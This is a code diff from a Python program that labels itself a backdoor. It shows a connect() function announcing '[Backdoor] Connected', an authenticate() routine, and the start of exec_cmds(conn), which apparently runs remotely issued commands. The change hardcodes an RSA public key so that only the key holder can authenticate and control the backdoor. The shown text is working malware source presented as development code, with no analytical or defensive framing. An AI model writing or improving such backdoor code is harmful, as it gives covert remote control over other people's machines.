@@ -26,30 +26,40 @@ def connect():
     print('[Backdoor] Connected with ' + addr[0] + ':' + str(addr[1]))
     return conn
 
+PUB_KEY = b"""-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApdaSQ/NaY8PFvyNJjKZ6
+pM40ZtpyPQqTfg0HE2e+G0sQ7kvKS/QxtJgo/NM+fgBPgaC4H3urapQ9EKlgbRLN
+nAzMpARRLz1/CJMGW0nngKw9cTnogF6IzyS0vydUObWDh22jGE2oIV9ASeAu7ItE
+8V371opZAgsx+TIMnfLQZPNKntE94J+V73JvzKSu1OflPXjfP8OWzfG9sQSMO06u
+oauxewo7ktFuJnu3e9YrX9lCqwUPUFKvFuwhZdzoqa/fE9R3wAdMF9Sm8xrbcxIU
+TzTPFbUH3+Ru6fQ8QvdaEci0GhSVqJnqXxbpAcN6loscNx2vpwFkLsivJvP8frzb
+PwIDAQAB
+-----END PUBLIC KEY-----
+"""
 
 def authenticate(conn):
     signature = conn.recv(4096)
     message = conn.recv(4096)
     success = True
-    with open("pubkey.pem", "rb") as key_file:
-        pub = serialization.load_pem_public_key(
-            key_file.read()
-        )
+    # with open("pubkey.pem", "rb") as key_file:
+    pub = serialization.load_pem_public_key(
+        PUB_KEY
+    )
 
-        try:
-            # verify signed message
-            pub.verify(
-                signature,
-                message,
-                padding.PSS(
-                    mgf=padding.MGF1(hashes.SHA256()),
-                    salt_length=padding.PSS.MAX_LENGTH
-                ),
-                hashes.SHA256()
-            )
-        except Exception as e:
-            # verification failed
-            success = False
+    try:
+        # verify signed message
+        pub.verify(
+            signature,
+            message,
+            padding.PSS(
+                mgf=padding.MGF1(hashes.SHA256()),
+                salt_length=padding.PSS.MAX_LENGTH
+            ),
+            hashes.SHA256()
+        )
+    except Exception as e:
+        # verification failed
+        success = False
     return success
 
 def exec_cmds(conn):
